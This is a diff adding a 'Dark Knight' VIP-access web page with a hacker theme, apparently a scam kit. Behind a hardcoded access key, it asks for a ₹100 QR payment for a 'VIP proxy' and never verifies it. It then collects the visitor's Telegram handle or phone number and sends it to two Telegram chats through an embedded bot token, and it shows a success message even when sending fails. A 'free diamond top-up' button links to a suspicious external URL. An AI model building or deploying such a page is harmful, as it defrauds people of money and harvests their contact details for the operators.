@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dark Knight | VIP Access</title>
+    <style>
+        body {
+            background-color: black;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            margin: 0;
+            overflow-x: hidden;
+        }
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+        .container {
+            position: relative;
+            padding: 20px;
+            max-width: 80%;
+            width: 300px;
+            margin: 100px auto;
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid #00ff00;
+            box-shadow: 0px 0px 15px #00ff00;
+            border-radius: 10px;
+            z-index: 2;
+        }
+        input, .button {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid #00ff00;
+            background: black;
+            color: #00ff00;
+            font-size: 1em;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .button:hover {
+            background-color: #00ff00;
+            color: black;
+        }
+        .error {
+            color: red;
+            margin-top: 10px;
+            display: none;
+        }
+        .hidden {
+            display: none;
+        }
+        .qr-code {
+            margin: 20px 0;
+            padding: 10px;
+            border: 2px solid #00ff00;
+        }
+        #paymentQR {
+            width: 200px;
+            height: 200px;
+            border: 2px solid #00ff00;
+            margin: 0 auto;
+            display: block;
+            background-color: white;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrix"></canvas>
+    
+    <!-- Key Entry -->
+    <div class="container" id="keyContainer">
+        <h2>🔒 Secure Access</h2>
+        <form id="keyForm">
+            <input type="password" id="accessKey" placeholder="Enter Access Key" required>
+            <button type="submit" class="button">Authenticate</button>
+        </form>
+        <p class="error" id="keyError">❌ Invalid Access Key!</p>
+    </div>
+
+    <!-- Options -->
+    <div class="container hidden" id="optionsContainer">
+        <h2>Select Service</h2>
+        <button class="button" id="vipBtn">VIP PROXY</button>
+        <button class="button" onclick="window.location.href='http://season-event.com.tr/^*Z/CODA/?id=6800292901'">FREE DIAMOND TOPUP</button>
+    </div>
+
+    <!-- Payment Section -->
+    <div class="container hidden" id="paymentContainer">
+        <h2>VIP Proxy Activation</h2>
+        <div class="qr-code">
+            <div id="paymentQR">[Payment QR Code]</div>
+            <p>Scan to Pay ₹100</p>
+        </div>
+        <button class="button" id="verifyPaymentBtn">Verify Payment</button>
+    </div>
+
+    <!-- Contact Form -->
+    <div class="container hidden" id="contactContainer">
+        <h2>Verify Identity</h2>
+        <form id="contactForm">
+            <input type="text" id="telegramID" placeholder="Telegram @username or Phone Number" required>
+            <button type="submit" class="button">Submit</button>
+        </form>
+    </div>
+
+    <!-- Confirmation -->
+    <div class="container hidden" id="confirmationContainer">
+        <h2>✓ Processing</h2>
+        <p>Your request is being verified</p>
+        <p>VIP details will be sent within 12 hours</p>
+        <p>Check your Telegram/mobile messages</p>
+    </div>
+
+    <script>
+        // Matrix Effect
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const chars = "Dark Knight Team 0101010101";
+        const columns = Math.floor(canvas.width / 20);
+        const drops = new Array(columns).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0F0';
+            ctx.font = '16px Courier New';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars[Math.floor(Math.random() * chars.length)];
+                ctx.fillText(text, i * 20, drops[i] * 20);
+                
+                if (drops[i] * 20 > canvas.height && Math.random() > 0.95) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 50);
+
+        // Application Logic
+        document.getElementById("keyForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            if (document.getElementById("accessKey").value === "DARKXVNIZSENSEI") {
+                document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+                document.getElementById("optionsContainer").classList.remove('hidden');
+            } else {
+                document.getElementById("keyError").style.display = "block";
+            }
+        });
+
+        document.getElementById("vipBtn").addEventListener("click", () => {
+            document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+            document.getElementById("paymentContainer").classList.remove('hidden');
+        });
+
+        document.getElementById("verifyPaymentBtn").addEventListener("click", () => {
+            document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+            document.getElementById("contactContainer").classList.remove('hidden');
+        });
+
+        document.getElementById("contactForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const contactInfo = document.getElementById("telegramID").value;
+            const botToken = '7793945096:AAEnx2qKx3CoNBNJg3dEY17JRocPN0Ehf94';
+            const chatIds = ['6800292901', '6287314531'];
+            const message = `🔥 New VIP Proxy Request:\n📱 Contact: ${contactInfo}\n=> Timestamp: ${new Date().toLocaleString()}`;
+
+            try {
+                // Send to first ID
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatIds[0],
+                        text: message
+                    })
+                });
+
+                // Send to second ID
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatIds[1],
+                        text: message
+                    })
+                });
+
+                document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+                document.getElementById("confirmationContainer").classList.remove('hidden');
+            } catch (error) {
+                console.error('Error sending message:', error);
+                document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+                document.getElementById("confirmationContainer").classList.remove('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
